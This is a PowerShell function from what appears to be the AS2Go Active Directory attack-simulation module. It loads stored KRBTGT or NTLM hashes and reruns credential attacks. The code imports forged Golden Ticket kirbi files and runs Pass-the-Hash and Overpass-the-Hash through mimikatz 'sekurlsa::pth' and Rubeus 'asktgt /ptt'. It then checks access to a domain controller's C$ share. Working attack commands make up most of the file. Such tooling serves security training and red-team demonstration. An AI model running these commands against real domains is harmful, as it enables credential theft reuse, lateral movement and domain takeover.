<#
.SYNOPSIS
Loads stored KRBTGT or NTLM hash data and reruns the matching ticket command.

.DESCRIPTION
Reads the saved ASP07KR and ASP07NT hash data from the AS2Go configuration and displays the stored values.
Offers to rerun the Golden Ticket command with the stored KRBTGT hash or the Pass-the-Hash command with the
stored NTLM hash, and reports the outcome of the selected injection.
Offers to repeat the selection after a command is started. Skip returns from the workflow.

.EXAMPLE
Invoke-StoredCredentialAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Mimikatz and previously stored ASP07KR or ASP07NT hash data in the AS2Go configuration.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Loads the stored KRBTGT or NTLM hash data and reruns the matching Golden Ticket or Pass-the-Hash command.
Shows the injection outcome so users can see how previously saved credential material is reused.
Request a Kerberos TGT using an NT hash (Overpass-the-Hash)
#>
function Invoke-StoredCredentialAttack {

    ################################################################################
    #####                                                                      #####
    #####         Load and reuse stored hash data                              #####
    #####                                                                     #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP07_LoadHash.html"
    Update-WindowTitle -NewTitle "Stored Credential Attack"
    Set-ASConfig -Setting "LastStage" -Value "Stored Credential Attack"

    $gtData = Get-ASConfig -Setting "ASP07KR" -DPAPI
    $ntData = Get-ASConfig -Setting "ASP07NT" -DPAPI

    $gtParts = If ($gtData) { $gtData.split("|") } else { @() }
    $ntParts = If ($ntData) { $ntData.split("|") } else { @() }

    # GoldenTicket checks first (FQDN) and last (domain SID) fields; the KR format still needs all five fields.
    $gtValid = ($gtParts.Count -eq 5) -and (Test-ADFormat -Type GoldenTicket -Value $gtData)
    $ntValid = Test-ADFormat -Type Hash -Value $ntData

    If (-not ($gtValid -or $ntValid)) {
        Write-AS2GoOutput -Type Warning -Message "No stored hash data found. Run the Golden Ticket attack or the Overpass-the-Hash attack first."
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    $helpKRBTGT = ""
    If ($gtValid) {
        $helpKRBTGT = "Forge a Golden Ticket for '$($gtParts[1])' in '$($gtParts[0])' with the stored KRBTGT hash."
    }
    $helpNTLM = ""
    If ($ntValid) {
        $helpNTLM = "Reuse the stored NTLM hash for '$($ntParts[1])' in '$($ntParts[0])'."
    }



    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Reuse a Previously Stored Credential"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    If ($gtValid) {
        Write-AS2GoOutput -Type TextMaker -Message "Stored KRBTGT hash data:" -TM "$gtData" -NoExtraLines
    }
    If ($ntValid) {
        Write-AS2GoOutput -Type TextMaker -Message "Stored NTLM   hash data:" -TM "$ntData" -NoExtraLines
    }
    write-host "`n"

    $title = "Stored Credential"
    $message = "Select the stored credential data to reuse."

    If ($SafeMode) {

        $Options = @(
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "Skip the Stored Credential simulation."
                Value = $Script:No
            }
        )
    }
    else {

        $Options = @(
            [pscustomobject] @{
                Label = "&KRBTGT (Golden Ticket)"
                Help  = $helpKRBTGT
                Value = "KRBTGT"
            },
            [pscustomobject] @{
                Label = "&NTLM (Pass-the-Hash)"
                Help  = $helpNTLM
                Value = "NTLM"
            },
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "Skip the Stored Credential simulation."
                Value = $Script:No
            }
        )
    }

    $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

    write-host "`n"

    If ($answer -eq "KRBTGT") {


        Add-Type -AssemblyName System.Windows.Forms

        $dialog = New-Object System.Windows.Forms.OpenFileDialog
        $dialog.Title = "Select Kirbi file"
        $dialog.Filter = "Kirbi files (*.kirbi)|*.kirbi"
        $dialog.Multiselect = $false
        $dialog.CheckFileExists = $true
        $dialog.InitialDirectory = $Script:AS2GoTicketsDir

        $dialogResult = $dialog.ShowDialog()
        if ($dialogResult -ne [System.Windows.Forms.DialogResult]::OK -or [string]::IsNullOrWhiteSpace($dialog.FileName)) {
            #throw "No Kirbi file selected. Script canceled."
            Write-Host "  [!] Canceled by user. No kirbi file was selected." -ForegroundColor Yellow
            return
        }

        $forgeTicketFile = $dialog.FileName

        $domain = $forgeTicketFile.split("@")[-1].Replace(".kirbi", "")

        $server = Get-BestDomainController -Domain $domain
        $validated = Import-KirbiFile -TicketFile $forgeTicketFile -Service "cifs/$server" -DomainController $server

        Test-AccessToOneDCPerDomain

        $tickets = Get-KlistTicket
        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
        Write-AS2GoOutput -Type Info -Message "Last Ticket"
        $tickets | Select-Object -Last 1 | Format-List

        if (-not $unattended) { pause }


    }
    elseif ($answer -eq "NTLM") {
        $Script:ASFQDN = $ntParts[0]
        $Global:ASHelpDeskUser = $ntParts[1]
        $Script:ASPtHntml = $ntParts[2]

        Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
        Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser, " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS

        $answer = Show-DecisionPrompt

        If ($answer -eq $Script:Yes) {

            $Options = @(
                [pscustomobject] @{
                    Label = "&Mimikatz"
                    Help  = "YES to proceed"
                    Value = "Mimikatz"
                },
                [pscustomobject] @{
                    Label = "&Rubeus"
                    Help  = "NO to cancel"
                    Value = "Rubeus"
                },
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = "SKIP to bypass this operation"
                    Value = $Script:Skip
                }
            )

            $Title = "Decision Required"
            $message = "Please make a decision:"
            $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

            If ($answer -eq "Mimikatz") {
                Invoke-Command -ScriptBlock {
                    & "$($Script:ASTools)\mimikatz.exe" `
                        "privilege::debug" `
                        "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
                        "exit"
                }

                Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
                Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
                Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
                Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
            }
            elseif ($answer -eq "Rubeus") {

                Invoke-Command -ScriptBlock {
                    & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
                }
                Test-AccessToOneDCPerDomain
                $tickets = Get-KlistTicket
                $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
                Write-AS2GoOutput -Type Info -Message "Last Ticket"
                $tickets | Select-object -Last 1 | Format-List
                if (-not $unattended) { pause }

            }
            elseif ($answer -eq $Script:Skip) {
            }

        }

    }
    else {
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    Measure-FunctionRuntime -End -Details $Info
}
